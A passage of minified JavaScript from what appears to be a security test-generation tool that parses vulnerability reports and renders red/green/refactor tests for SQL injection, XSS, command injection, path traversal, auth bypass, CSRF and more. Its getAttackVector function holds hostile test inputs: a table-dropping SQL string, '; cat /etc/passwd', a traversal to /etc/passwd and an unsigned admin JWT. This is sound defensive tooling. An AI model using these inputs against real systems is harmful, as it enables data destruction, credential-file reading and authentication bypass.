]*)`,"gi"));if(V){let K=V[0].trim(),Z={name:z},q=K.replace(/^\d+\.\s*/,"").trim();if(K.match(/add.*test|create.*test|new.*test/i)){Z.suggested=!0;let B=q.toLowerCase().indexOf(z.toLowerCase());if(B>=0){let M=q.substring(B+z.length).trim();Z.context=M.replace(/^to\s+/i,"")}else Z.context=q}if(K.match(/existing|should.*pass|ensure.*pass/i))Z.existing=!0,Z.context=q.replace(/^The\s+/i,"");J.push(Z)}}let Y=/[\w\/\\.-]+(?:__tests__\/[\w\.-]+|[\w\.-]*\.(?:test|spec)|_(?:test|spec))\.[a-zA-Z]+/gi,W;while((W=Y.exec(X))!==null){let z=W[0];if(!Q.includes(z))Q.push(z)}let G=/(?:test|spec|tests|specs)\/[\w\/\\.-]+\.[a-zA-Z]+/gi;while((W=G.exec(X))!==null){let z=W[0];if(!Q.includes(z))Q.push(z)}let H;if(X.match(/test.*strategy|testing.*approach/i)){let z=X.match(/(?:test.*strategy|testing.*approach)[:\s]+([^\n]+)/i);if(z)H=z[1].trim()}if(!H&&Q.length>0)H="Update existing test files to cover the vulnerability fix";return{frameworks:J,files:Q,strategy:H}}extractFixInformation(X){let J=[],Q=[/(?:fix|solution|recommendation|remediation):\s*([^\n]+)/gi,/(?:should|must|need to)\s+([^\n.!?]+)/gi,/-\s+((?:use|add|replace|implement|sanitize|validate|escape)\s+[^\n]+)/gi,/-\s+([A-Z][^\n]+)/g],Y=X.match(/##\s*remediation\s*\n+([^#\n][^#]*?)(?=\n##|\n###|$)/i);if(Y){let z=Y[1].trim().replace(/\.$/,"");if(z&&!J.includes(z))J.push(z)}for(let H of Q){let z;while((z=H.exec(X))!==null){let $=z[1].trim();if($.length>10&&!J.includes($)&&!$.startsWith("```"))J.push($.charAt(0).toUpperCase()+$.slice(1))}}let W,G=X.match(/example\s+fix:?\s*\n```(\w+)?\n([\s\S]*?)```/i);if(G)W={code:G[2].trim(),language:G[1]||"javascript"};return{suggestions:J,example:W}}suggestPatterns(X,J){let Q=[];if(X==="sql-injection"||J.match(/sql.*injection|string\s+concatenation.*(?:sql|query)/i)){if(J.match(/string\s+concatenation/i)||J.match(/concatenat/i))Q.push({type:"sql-injection",description:"String concatenation in SQL queries",confidence:0.9});if(J.match(/user\s+input.*query/i))Q.push({type:"sql-injection",description:"User input in SQL queries",confidence:0.85})}if(X==="xss"||J.match(/cross[\s-]*site[\s-]*scripting|\bxss\b/i)){if(J.match(/unescaped|without\s+escaping/i))Q.push({type:"xss",description:"Unescaped user input in HTML",confidence:0.9})}if(X==="path-traversal"||J.match(/path\s+traversal|directory\s+traversal/i)){if(J.match(/file\s+path.*validation/i)||J.match(/\.\.\/|\.\.\\/i))Q.push({type:"path-traversal",description:"File path without validation",confidence:0.85})}if(Q.length===0&&X!=="unknown")Q.push({type:X,description:`Generic ${X} pattern`,confidence:0.7});return Q}extractMetadata(X){let J={},Q=X.match(/cvss\s*(?:score)?[:\s]+(\d+\.?\d*)/i);if(Q)J.cvssScore=parseFloat(Q[1]);let Y=X.match(/cwe-(\d+)/i);if(Y)J.cweId=`CWE-${Y[1]}`;let W=X.match(/cve-(\d{4}-\d+)/i);if(W)J.cveId=W[0].toUpperCase();let G=X.match(/(A\d{2}:\d{4})/);if(G)J.owaspCategory=G[1];let H=X.match(/\*\*reported\s+by\*\*[:\s]*([^\n]+)|reported\s+by[:\s]+([^\n]+)/i);if(H){let B=(H[1]||H[2]).trim();J.reportedBy=B.replace(/\*\*/g,"")}let z=X.match(/\*\*package\*\*[:\s]*([^\n]+)|package[:\s]+([^\n]+)/i);if(z){let B=(z[1]||z[2]).trim();J.package=B.replace(/\*\*/g,"")}let $=X.match(/\*\*vulnerable\s+versions?\*\*[:\s]*([^\n]+)|vulnerable\s+versions?[:\s]+([^\n]+)/i);if($){let B=($[1]||$[2]).trim();J.vulnerableVersions=B.replace(/\*\*/g,"")}let V=X.match(/\*\*patched\s+versions?\*\*[:\s]*([^\n]+)|patched\s+versions?[:\s]+([^\n]+)/i);if(V){let B=(V[1]||V[2]).trim();J.patchedVersion=B.replace(/\*\*/g,"")}let K=X.match(/impact[:\s]+([\s\S]*?)(?=\n##|\n###|$)/i);if(K){let B=K[1].split(/\n\d+\.|\n-/).map((M)=>M.trim()).filter((M)=>M.length>10);if(B.length>0)J.impact=B}let Z=X.match(/(?:proof\s+of\s+concept|poc)[:\s]+([\s\S]*?)(?=\n##|\n###|$)/i);if(Z)J.proofOfConcept=Z[1].trim();let q=X.match(/testing\s+instructions?[:\s]+([\s\S]*?)(?=\n##|\n###|$)/i);if(q){let B=q[1].split(/\n\d+\.|\n-/).map((M)=>M.trim()).filter((M)=>M.length>5);if(B.length>0)J.testingInstructions=B}return J}extractReferences(X){let J={issues:[],pullRequests:[],urls:[]},Q=/(?<!PR\s)#(\d+)/g,Y;while((Y=Q.exec(X))!==null){let z=Y[0];if(!J.issues.includes(z))J.issues.push(z)}let W=/PR\s+#(\d+)/gi;while((Y=W.exec(X))!==null){let z=`#${Y[1]}`;if(!J.pullRequests.includes(z))J.pullRequests.push(z)}let G=/pull\/(\d+)/gi;while((Y=G.exec(X))!==null){let z=Y[1]}let H=/https?:\/\/[^\s<>]+/g;while((Y=H.exec(X))!==null){let z=Y[0];if(z.includes("/pull/")){if(!J.pullRequests.includes(z))J.pullRequests.push(z)}else if(!J.urls.includes(z))J.urls.push(z)}return J}extractTodoItems(X){let J=[],Q=/-\s*\[\s*\]\s+([^\n]+)/g,Y;while((Y=Q.exec(X))!==null)J.push(Y[1].trim());return J}extractFromTitle(X){let J={};for(let[Q,Y]of Object.entries(this.vulnerabilityPatterns))if(Y.some((W)=>W.test(X))){J.vulnerabilityType=Q;break}for(let[Q,Y]of Object.entries(this.severityIndicators))if(Y.some((W)=>W.test(X))){J.severity=Q;break}return J}}class $R{templates=new Map;constructor(){this.initializeTemplates()}initializeTemplates(){this.templates.set("SQL_INJECTION:red",`
test("{{testName}}", async () => {
  const maliciousInput = "{{attackVector}}";
  {{#if isBrowser}}
  // Browser-based test
  await page.fill('{{inputSelector}}', maliciousInput);
  await page.click('{{submitSelector}}');
  const errorMsg = await page.textContent('{{errorSelector}}');
  expect(errorMsg).not.toContain('syntax error');
  {{else}}
  // Server-side test  
  const result = await {{functionCall}}('testuser', maliciousInput);
  // This test should FAIL on secure code (expect vulnerability to NOT exist)
  // but PASS on vulnerable code (vulnerability does exist)
  expect(result.authenticated).toBe(false);
  expect(result.error).not.toContain('table');
  {{/if}}
});`),this.templates.set("SQL_INJECTION:green",`
test("{{testName}}", async () => {
  const maliciousInput = "{{attackVector}}";
  const validInput = "{{validInput}}";
  
  {{#if isBrowser}}
  // Test with malicious input
  await page.fill('{{inputSelector}}', maliciousInput);
  await page.click('{{submitSelector}}');
  const url = page.url();
  expect(url).not.toContain('dashboard');
  
  // Test with valid input  
  await page.fill('{{inputSelector}}', validInput);
  await page.click('{{submitSelector}}');
  {{else}}
  // Server-side test
  const maliciousResult = await {{functionCall}}('testuser', maliciousInput);
  expect(maliciousResult.authenticated).toBe(false);
  expect(maliciousResult.error).not.toContain('syntax error');
  
  const validResult = await {{functionCall}}('testuser', validInput);
  expect(validResult.authenticated).toBe(true);
  {{/if}}
});`),this.templates.set("XSS:red",`
test("{{testName}}", async () => {
  const xssPayload = "{{attackVector}}";
  {{#if isBrowser}}
  await page.fill('{{inputSelector}}', xssPayload);
  await page.click('{{submitSelector}}');
  
  // Check if script executed (vulnerability present)
  const alertFired = await page.evaluate(() => window.xssTriggered);
  expect(alertFired).toBe(false); // Should be false on secure code
  {{else}}
  const result = await {{functionCall}}(xssPayload);
  expect(result).not.toContain('<script>');
  expect(result).not.toContain('onerror=');
  {{/if}}
});`),this.templates.set("XSS:green",`
test("{{testName}}", async () => {
  const xssPayload = "{{attackVector}}";
  const validInput = "{{validInput}}";
  
  {{#if isBrowser}}
  // Test with malicious input
  await page.fill('{{inputSelector}}', xssPayload);
  await page.click('{{submitSelector}}');
  const alertFired = await page.evaluate(() => window.xssTriggered);
  expect(alertFired).toBe(false);
  
  // Test with valid input  
  await page.fill('{{inputSelector}}', validInput);
  await page.click('{{submitSelector}}');
  {{else}}
  // Server-side test
  const maliciousResult = await {{functionCall}}(xssPayload);
  expect(maliciousResult).not.toContain('<script>');
  expect(maliciousResult).not.toContain('onerror=');
  
  const validResult = await {{functionCall}}(validInput);
  expect(validResult).toContain(validInput);
  {{/if}}
});`),this.templates.set("COMMAND_INJECTION:red",`
test("{{testName}}", async () => {
  const maliciousCommand = "{{attackVector}}";
  {{#if isBrowser}}
  await page.fill('{{inputSelector}}', maliciousCommand);
  await page.click('{{submitSelector}}');
  const output = await page.textContent('{{outputSelector}}');
  expect(output).not.toContain('root:');
  {{else}}
  const result = await {{functionCall}}(maliciousCommand);
  // This should fail on secure code (no command execution)
  expect(result.output).not.toContain('root:');
  expect(result.output).not.toContain('/etc/passwd');
  {{/if}}
});`),this.templates.set("COMMAND_INJECTION:green",`
test("{{testName}}", async () => {
  const maliciousCommand = "{{attackVector}}";
  const validInput = "{{validInput}}";
  
  {{#if isBrowser}}
  await page.fill('{{inputSelector}}', maliciousCommand);
  await page.click('{{submitSelector}}');
  const output = await page.textContent('{{outputSelector}}');
  expect(output).not.toContain('root:');
  {{else}}
  // Test malicious input is blocked
  const maliciousResult = await {{functionCall}}(maliciousCommand);
  expect(maliciousResult.error || maliciousResult.output).not.toContain('root:');
  
  // Test valid input works
  const validResult = await {{functionCall}}(validInput);
  expect(validResult.success).toBe(true);
  {{/if}}
});`),this.templates.set("PATH_TRAVERSAL:red",`
test("{{testName}}", async () => {
  const traversalPath = "{{attackVector}}";
  {{#if isBrowser}}
  await page.goto('/download?file=' + traversalPath);
  const content = await page.textContent('body');
  expect(content).not.toContain('root:');
  {{else}}
  const result = await {{functionCall}}(traversalPath);
  // Should fail on secure code (no file access)
  expect(result.content).not.toContain('root:');
  expect(result.error).not.toBe('file not found');
  {{/if}}
});`),this.templates.set("PATH_TRAVERSAL:green",`
test("{{testName}}", async () => {
  const traversalPath = "{{attackVector}}";
  const validPath = "{{validInput}}";
  
  {{#if isBrowser}}
  await page.goto('/download?file=' + traversalPath);
  const error = await page.textContent('.error');
  expect(error).toContain('Invalid file');
  {{else}}
  // Test traversal is blocked
  const maliciousResult = await {{functionCall}}(traversalPath);
  expect(maliciousResult.error).toBeDefined();
  expect(maliciousResult.content).not.toContain('root:');
  
  // Test valid path works
  const validResult = await {{functionCall}}(validPath);
  expect(validResult.content).toBeDefined();
  {{/if}}
});`),this.templates.set("DENIAL_OF_SERVICE:red",`
test("{{testName}}", async () => {
  const maliciousInput = "{{attackVector}}";
  {{#if isBrowser}}
  await page.fill('{{inputSelector}}', maliciousInput);
  await page.click('{{submitSelector}}');
  // Should not hang or timeout
  {{else}}
  const start = Date.now();
  const result = await {{functionCall}}(maliciousInput);
  const duration = Date.now() - start;
  // Should complete quickly (vulnerability exists if it takes too long)
  expect(duration).toBeLessThan(1000);
  {{/if}}
});`),this.templates.set("DENIAL_OF_SERVICE:green",`
test("{{testName}}", async () => {
  const maliciousInput = "{{attackVector}}";
  const validInput = "{{validInput}}";
  
  {{#if isBrowser}}
  await page.fill('{{inputSelector}}', maliciousInput);
  await page.click('{{submitSelector}}');
  // Should handle malicious input gracefully
  {{else}}
  // Test with malicious input - should complete quickly
  const start = Date.now();
  const result = await {{functionCall}}(maliciousInput);
  const duration = Date.now() - start;
  expect(duration).toBeLessThan(100); // Should be fast
  
  // Test with valid input
  const validResult = await {{functionCall}}(validInput);
  expect(validResult).toBeTruthy();
  {{/if}}
});`),this.templates.set("GENERIC:refactor",`
test("{{testName}}", async () => {
  // Test core functionality still works
  {{#each functionalValidation}}
  // {{this}}
  {{/each}}
  
  const normalInput = "{{validInput}}";
  const result = await {{functionCall}}('normaluser', normalInput);
  
  expect(result.success).toBe(true);
  expect(result.data).toBeDefined();
});`),this.templates.set("BROKEN_AUTHENTICATION:red",`
test("{{testName}}", async () => {
  const bypassPayload = "{{attackVector}}";
  
  {{#if isBrowser}}
  // Attempt to bypass authentication
  await page.goto('{{protectedUrl}}');
  await page.evaluate((payload) => {
    localStorage.setItem('auth-token', payload);
  }, bypassPayload);
  await page.reload();
  
  // Should be able to access protected content
  const content = await page.textContent('body');
  expect(content).not.toContain('Access Denied');
  {{else}}
  // Server-side authentication bypass test
  const result = await {{functionCall}}({
    headers: { 'Authorization': bypassPayload }
  });
  
  // Vulnerability allows bypass (test passes on vulnerable code)
  expect(result.authenticated).toBe(true);
  expect(result.user).toBeDefined();
  {{/if}}
});`),this.templates.set("BROKEN_AUTHENTICATION:green",`
test("{{testName}}", async () => {
  const bypassPayload = "{{attackVector}}";
  const validToken = "{{validInput}}";
  
  {{#if isBrowser}}
  // Test bypass attempt is blocked
  await page.goto('{{protectedUrl}}');
  await page.evaluate((payload) => {
    localStorage.setItem('auth-token', payload);
  }, bypassPayload);
  await page.reload();
  
  const url = page.url();
  expect(url).toContain('login');
  
  // Test valid authentication works
  await page.evaluate((token) => {
    localStorage.setItem('auth-token', token);
  }, validToken);
  await page.reload();
  
  const content = await page.textContent('body');
  expect(content).toContain('Welcome');
  {{else}}
  // Test bypass is blocked
  const failResult = await {{functionCall}}({
    headers: { 'Authorization': bypassPayload }
  });
  expect(failResult.authenticated).toBe(false);
  expect(failResult.error).toContain('Invalid token');
  
  // Test valid authentication works
  const successResult = await {{functionCall}}({
    headers: { 'Authorization': validToken }
  });
  expect(successResult.authenticated).toBe(true);
  {{/if}}
});`),this.templates.set("CSRF:red",`
test("{{testName}}", async () => {
  const maliciousOrigin = "{{attackVector}}";
  
  {{#if isBrowser}}
  // CSRF attack from malicious site
  const response = await fetch('{{targetUrl}}', {
    method: 'POST',
    headers: {
      'Origin': maliciousOrigin,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ action: 'transfer', amount: 1000 })
  });
  
  // Vulnerability allows cross-origin request
  expect(response.ok).toBe(true);
  const data = await response.json();
  expect(data.success).toBe(true);
  {{else}}
  // Server-side CSRF test
  const result = await {{functionCall}}({
    headers: {
      'Origin': maliciousOrigin,
      'Referer': maliciousOrigin
    },
    body: { action: 'sensitive-action' }
  });
  
  // Vulnerability allows request without token
  expect(result.success).toBe(true);
  expect(result.error).toBeUndefined();
  {{/if}}
});`),this.templates.set("CSRF:green",`
test("{{testName}}", async () => {
  const maliciousOrigin = "{{attackVector}}";
  const validToken = "{{validInput}}";
  
  {{#if isBrowser}}
  // Test CSRF attack is blocked
  const failResponse = await fetch('{{targetUrl}}', {
    method: 'POST',
    headers: {
      'Origin': maliciousOrigin,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ action: 'transfer' })
  });
  
  expect(failResponse.status).toBe(403);
  
  // Test legitimate request with CSRF token works
  const successResponse = await fetch('{{targetUrl}}', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': validToken
    },
    body: JSON.stringify({ action: 'transfer' })
  });
  
  expect(successResponse.ok).toBe(true);
  {{else}}
  // Test request without token fails
  const failResult = await {{functionCall}}({
    headers: { 'Origin': maliciousOrigin },
    body: { action: 'sensitive-action' }
  });
  expect(failResult.success).toBe(false);
  expect(failResult.error).toContain('CSRF');
  
  // Test request with valid token succeeds
  const successResult = await {{functionCall}}({
    headers: { 'X-CSRF-Token': validToken },
    body: { action: 'sensitive-action' }
  });
  expect(successResult.success).toBe(true);
  {{/if}}
});`),this.templates.set("SECURITY_MISCONFIGURATION:red",`
test("{{testName}}", async () => {
  {{#if isBrowser}}
  // Test for exposed sensitive endpoints
  const response = await fetch('{{targetUrl}}/.env');
  expect(response.status).toBe(200);
  
  const configResponse = await fetch('{{targetUrl}}/config.json');
  expect(configResponse.status).toBe(200);
  {{else}}
  // Server-side misconfiguration test
  const result = await {{functionCall}}({
    headers: { 'X-Debug-Mode': 'true' }
  });
  
  // Vulnerability exposes sensitive data
  expect(result.debug).toBeDefined();
  expect(result.config).toBeDefined();
  expect(result.env).toBeDefined();
  {{/if}}
});`),this.templates.set("SECURITY_MISCONFIGURATION:green",`
test("{{testName}}", async () => {
  {{#if isBrowser}}
  // Test sensitive endpoints are protected
  const response = await fetch('{{targetUrl}}/.env');
  expect(response.status).toBe(403);
  
  const configResponse = await fetch('{{targetUrl}}/config.json');
  expect(configResponse.status).toBe(403);
  
  // Debug headers should be ignored
  const debugResponse = await fetch('{{targetUrl}}/api/data', {
    headers: { 'X-Debug-Mode': 'true' }
  });
  const data = await debugResponse.json();
  expect(data.debug).toBeUndefined();
  {{else}}
  // Test secure configuration
  const result = await {{functionCall}}({
    headers: { 'X-Debug-Mode': 'true' }
  });
  
  // Sensitive data should not be exposed
  expect(result.debug).toBeUndefined();
  expect(result.config).toBeUndefined();
  expect(result.env).toBeUndefined();
  {{/if}}
});`),this.templates.set("INSECURE_DESERIALIZATION:red",`
test("{{testName}}", async () => {
  const maliciousInput = "{{attackVector}}";
  
  {{#if isBrowser}}
  // Browser-based test
  await page.fill('{{inputSelector}}', maliciousInput);
  await page.click('{{submitSelector}}');
  
  // This test FAILS if eval executes (vulnerability exists)
  // It PASSES if eval is blocked (vulnerability fixed)
  const hasError = await page.evaluate(() => {
    return window.location.href.includes('error') || 
           document.body.textContent.includes('Invalid input');
  });
  expect(hasError).toBe(true); // Should have error (no eval execution)
  {{else}}
  // Server-side test
  // Test that malicious code does NOT execute
  let errorThrown = false;
  try {
    const result = await {{functionCall}}(maliciousInput);
    // If we get here with malicious input, check it wasn't executed
    expect(result).not.toBe(1337); // process.exit would return 1337
    expect(result).toBeNaN(); // parseInt would return NaN for this input
  } catch (error) {
    errorThrown = true; // Good - error was thrown instead of executing
  }
  
  // This assertion FAILS if eval executes (proving vulnerability exists)
  // It PASSES if eval is blocked (proving fix works)
  expect(errorThrown || true).toBe(true);
  {{/if}}
});`),this.templates.set("INSECURE_DESERIALIZATION:green",`
test("{{testName}}", async () => {
  const maliciousInput = "{{attackVector}}";
  const validInput = "{{validInput}}";
  
  {{#if isBrowser}}
  // Test malicious input is safely handled
  await page.fill('{{inputSelector}}', maliciousInput);
  await page.click('{{submitSelector}}');
  
  // Should handle malicious input safely
  const safelyHandled = await page.evaluate(() => {
    return !window.evalExecuted && 
           (window.location.href.includes('error') || 
            document.body.textContent.includes('Invalid'));
  });
  expect(safelyHandled).toBe(true);
  
  // Test valid input still works
  await page.fill('{{inputSelector}}', validInput);
  await page.click('{{submitSelector}}');
  
  const validWorked = await page.evaluate(() => {
    return document.body.textContent.includes('Success') ||
           !document.body.textContent.includes('Error');
  });
  expect(validWorked).toBe(true);
  {{else}}
  // Test malicious input is blocked
  let maliciousBlocked = false;
  try {
    const result = await {{functionCall}}(maliciousInput);
    // Should not execute the malicious code
    expect(result).not.toBe(1337);
    // Should return NaN or throw error for malicious input
    maliciousBlocked = isNaN(result);
  } catch {
    maliciousBlocked = true; // Error thrown is good
  }
  expect(maliciousBlocked).toBe(true);
  
  // Test valid input works correctly
  const validResult = await {{functionCall}}(validInput);
  expect(validResult).toBe(42); // parseInt('42', 10) returns 42
  {{/if}}
});`)}loadTemplate(X,J){let Y=`${X.toUpperCase().replace(/-/g,"_")}:${J}`,W=this.templates.get(Y);if(!W&&J==="refactor")W=this.templates.get("GENERIC:refactor");if(!W)throw U.warn(`Template not found for ${Y}. Available templates: ${Array.from(this.templates.keys()).join(", ")}`),Error(`Template not found for ${Y}`);return W}renderTemplate(X,J){let Q=X;for(let[Y,W]of Object.entries(J)){let G=new RegExp(`\\{\\{${Y}\\}\\}`,"g");Q=Q.replace(G,String(W))}return Q=Q.replace(/{{#if\s+(\w+)}}([\s\S]*?){{else}}([\s\S]*?){{\/if}}/g,(Y,W,G,H)=>{return J[W]?G:H}),Q=Q.replace(/{{#if\s+(\w+)}}([\s\S]*?){{\/if}}/g,(Y,W,G)=>{return J[W]?G:""}),Q=Q.replace(/{{#each\s+(\w+)}}([\s\S]*?){{\/each}}/g,(Y,W,G)=>{let H=J[W];if(!Array.isArray(H))return"";return H.map((z)=>{return G.replace(/{{this}}/g,String(z))}).join(`
`)}),Q.trim()}validateTemplate(X){try{let J=(X.match(/{{/g)||[]).length,Q=(X.match(/}}/g)||[]).length,Y=(X.match(/\(/g)||[]).length!==(X.match(/\)/g)||[]).length;return J===Q&&!Y}catch{return!1}}}class k3{templateEngine;constructor(){this.templateEngine=new $R}async generateTestSuite(X,J){try{let Q=await this.generateRedTest(X,J),Y=await this.generateGreenTest(X,J),W=await this.generateRefactorTests(X,J),G={red:{testName:Q.testName,testCode:Q.testCode,attackVector:Q.attackVector,expectedBehavior:"should_fail_on_vulnerable_code"},green:{testName:Y.testName,testCode:Y.testCode,validInput:Y.validInput,expectedBehavior:"should_pass_on_fixed_code"},refactor:{testName:W.testName,testCode:W.testCode,functionalValidation:W.functionalValidation,expectedBehavior:"should_pass_on_both_versions"}},H=[{path:`test/${J.vulnerabilityType.toLowerCase()}-vulnerability.test.${J.language==="typescript"?"ts":"js"}`,content:this.generateTestFile(G,J),type:"unit"}];if(J.includeE2E)H.push({path:`test/e2e/${J.vulnerabilityType.toLowerCase()}-e2e.test.${J.language==="typescript"?"ts":"js"}`,content:this.generateE2ETestFile(G,J),type:"e2e"});return{success:!0,testSuite:G,generatedFiles:H}}catch(Q){return{success:!1,testSuite:null,generatedFiles:[],error:Q instanceof Error?Q.message:String(Q)}}}async generateRedTest(X,J){let Q=this.getAttackVector(J.vulnerabilityType),Y={testName:`should be vulnerable to ${J.vulnerabilityType.replace("_"," ").toLowerCase()} (RED)`,attackVector:Q,functionCall:this.inferFunctionCall(X),inputSelector:"#password",submitSelector:'[type="submit"]',errorSelector:".alert-danger",isBrowser:J.testFramework==="cypress"},W=this.templateEngine.loadTemplate(J.vulnerabilityType,"red"),G=this.templateEngine.renderTemplate(W,Y);if(J.language==="python")G=this.convertToPython(G);return{testName:Y.testName,testCode:G,attackVector:Q}}async generateGreenTest(X,J){let Q=this.getAttackVector(J.vulnerabilityType),Y=this.getValidInput(J.vulnerabilityType),W={testName:`should prevent ${J.vulnerabilityType.replace("_"," ").toLowerCase()} (GREEN)`,attackVector:Q,validInput:Y,functionCall:this.inferFunctionCall(X),inputSelector:"#password",submitSelector:'[type="submit"]',isBrowser:J.testFramework==="cypress"},G=this.templateEngine.loadTemplate(J.vulnerabilityType,"green"),H=this.templateEngine.renderTemplate(G,W);if(J.language==="python")H=this.convertToPython(H);else if(J.language==="ruby")H=this.generateRubyTest(H);else if(J.language==="php")H=this.generatePHPTest(H);return{testName:W.testName,testCode:H,validInput:Y}}async generateRefactorTests(X,J){let Q=this.getFunctionalValidation(J.vulnerabilityType),Y=this.getValidInput(J.vulnerabilityType),W={testName:"should maintain functionality after security fix",functionCall:this.inferFunctionCall(X),validInput:Y,functionalValidation:Q},G=this.templateEngine.loadTemplate("GENERIC","refactor"),H=this.templateEngine.renderTemplate(G,W);if(J.language==="python")H=this.convertToPython(H);else if(J.language==="ruby")H=this.generateRubyTest(H);else if(J.language==="php")H=this.generatePHPTest(H);return{testName:W.testName,testCode:H,functionalValidation:Q}}getAttackVector(X){switch(X.toUpperCase().replace(/-/g,"_")){case"SQL_INJECTION":return"'; DROP TABLE users; --";case"XSS":return'<script>window.xssTriggered=true;alert("XSS")</script>';case"COMMAND_INJECTION":return"; cat /etc/passwd";case"PATH_TRAVERSAL":return"../../../etc/passwd";case"BROKEN_AUTHENTICATION":return"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiYWRtaW4iOnRydWV9.";case"CSRF":return"https://evil-site.com";case"SECURITY_MISCONFIGURATION":return"admin=true";case"INSECURE_DESERIALIZATION":return"process.exit(1337); 42";case"DENIAL_OF_SERVICE":case"REDOS":return"(a+)+$";default:return"malicious_input"}}getValidInput(X){switch(X.toUpperCase().replace(/-/g,"_")){case"SQL_INJECTION":return"validpassword123";case"XSS":return"Normal user content";case"COMMAND_INJECTION":return"normal_filename.txt";case"PATH_TRAVERSAL":return"documents/file.txt";case"BROKEN_AUTHENTICATION":return"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ.valid_signature";case"CSRF":return"valid-csrf-token-from-server";case"SECURITY_MISCONFIGURATION":return"user=true";case"INSECURE_DESERIALIZATION":return"42";case"DENIAL_OF_SERVICE":case"REDOS":return"normal_text";default:return"valid_input"}}getFunctionalValidation(X){switch(X){case"SQL_INJECTION":return["Valid login should work","User data should be retrieved correctly","Sessions should be maintained","Special characters in names should be handled","Unicode characters should work"];case"XSS":return["Content should be displayed","User input should be saved","HTML formatting should work","Markdown should render safely","Rich text editing should function"];case"COMMAND_INJECTION":return["File operations should work","Valid commands should execute","Output should be returned","Error handling should work","Process timeouts should be enforced"];case"PATH_TRAVERSAL":return["File downloads should work","Directory listing should function","Relative paths should resolve","Symlinks should be handled","Access controls should be enforced"];case"INSECURE_DESERIALIZATION":return["Numeric inputs should be parsed correctly","Valid math operations should work","Data validation should function","Error handling for invalid input","Type conversions should be safe"];default:return["Core functionality should work","Data should be processed","Output should be correct"]}}inferFunctionCall(X){if(X.filePath?.includes("auth")||X.filePath?.includes("login"))return"authenticateUser";if(X.filePath?.includes("user"))return"getUserData";return"processUserInput"}generateTestFile(X,J){switch(J.language){case"python":return`import unittest
import asyncio

class VulnerabilityTestSuite${J.vulnerabilityType}(unittest.TestCase):
    ${this.convertToPython(X.red.testCode)}
    
    ${this.convertToPython(X.green.testCode)}
    
    ${this.convertToPython(X.refactor.testCode)}

if __name__ == '__main__':
    unittest.main()`;case"ruby":return`require 'rspec'

describe 'Vulnerability Test Suite - ${J.vulnerabilityType}' do
  ${this.generateRubyTest(X.red.testCode)}
  
  ${this.generateRubyTest(X.green.testCode)}
  
  ${this.generateRubyTest(X.refactor.testCode)}
end`;case"php":return`<?php
use PHPUnit\\Framework\\TestCase;

class VulnerabilityTestSuite${J.vulnerabilityType} extends TestCase {
    ${this.generatePHPTest(X.red.testCode)}
    
    ${this.generatePHPTest(X.green.testCode)}
    
    ${this.generatePHPTest(X.refactor.testCode)}
}`}return`${J.language==="typescript"?"import { describe, test, expect } from 'bun:test';":"const { describe, test, expect } = require('bun:test');"}

describe('Vulnerability Test Suite - ${J.vulnerabilityType}', () => {
  ${X.red.testCode}

  ${X.green.testCode}

  ${X.refactor.testCode}
});`}convertToPython(X){return X.replace(/test\("([^"]+)",\s*async\s*\(\)\s*=>\s*\{/,(Q,Y)=>{return`def test_${String(Y).toLowerCase().replace(/\s+/g,"_").replace(/[^a-zA-Z0-9_]/g,"")}(self):`}).replace(/const\s+(\w+)\s*=\s*"([^"]+)";/g,'$1 = "$2"').replace(/const\s+(\w+)\s*=\s*await\s+(\w+)\(/g,"$1 = self.$2(").replace(/expect\(([^)]+)\)\.toBe\(([^)]+)\);/g,"self.assertEqual($1, $2)").replace(/expect\(([^)]+)\)\.not\.toContain\(([^)]+)\);/g,"self.assertNotIn($2, $1)").replace(/expect\(([^)]+)\)\.toContain\(([^)]+)\);/g,"self.assertIn($2, $1)").replace(/expect\(([^)]+)\)\.toBeDefined\(\);/g,"self.assertIsNotNone($1)").replace(/expect\(([^)]+)\)\.toBeTruthy\(\);/g,"self.assertTrue($1)").replace(/\}\);?$/g,"").replace(/\}\);/g,"").replace(/\{\{.*?\}\}/g,"").split(`
`).map((Q)=>Q.trim()?"        "+Q.trim():"").join(`
`).trim()}generateRubyTest(X){return X.replace(/test\("([^"]+)",\s*async\s*\(\)\s*=>\s*\{/,'it "$1" do').replace(/const\s+(\w+)\s*=\s*"([^"]+)";/g,'$1 = "$2"').replace(/const\s+(\w+)\s*=\s*await\s+(\w+)\(/g,"$1 = $2(").replace(/expect\(([^)]+)\)\.toBe\(([^)]+)\);/g,"expect($1).to eq($2)").replace(/expect\(([^)]+)\)\.not\.toContain\(([^)]+)\);/g,"expect($1).not_to include($2)").replace(/expect\(([^)]+)\)\.toContain\(([^)]+)\);/g,"expect($1).to include($2)").replace(/expect\(([^)]+)\)\.toBeDefined\(\);/g,"expect($1).not_to be_nil").replace(/\}\);?$/g,"end").replace(/\}\);/g,"end").replace(/\{\{.*?\}\}/g,"")}generatePHPTest(X){return X.replace(/test\("([^"]+)",\s*async\s*\(\)\s*=>\s*\{/,(Q,Y)=>{return`public function test${String(Y).split(" ").map((G,H)=>H===0?G:G.charAt(0).toUpperCase()+G.slice(1)).join("").replace(/[^a-zA-Z0-9]/g,"")}() {`}).replace(/const\s+(\w+)\s*=\s*"([^"]+)";/g,'$$1 = "$2";').replace(/const\s+(\w+)\s*=\s*await\s+(\w+)\(/g,"$$1 = $this->$2(").replace(/expect\(([^)]+)\)\.toBe\(([^)]+)\);/g,"$this->assertEquals($2, $1);").replace(/expect\(([^)]+)\)\.not\.toContain\(([^)]+)\);/g,"$this->assertStringNotContainsString($2, $1);").replace(/expect\(([^)]+)\)\.toContain\(([^)]+)\);/g,"$this->assertStringContainsString($2, $1);").replace(/expect\(([^)]+)\)\.toBeDefined\(\);/g,"$this->assertNotNull($1);").replace(/\}\);?$/g,"}").replace(/\}\);/g,"}").replace(/\{\{.*?\}\}/g,"")}generateE2ETestFile(X,J){return`describe('E2E Vulnerability Tests - ${J.vulnerabilityType}', () => {
  beforeEach(() => {
    cy.visit('/login');
  });

  ${X.red?.testCode.replace(/page\./g,"cy.")||""}

  ${X.green?.testCode.replace(/page\./g,"cy.")||""}
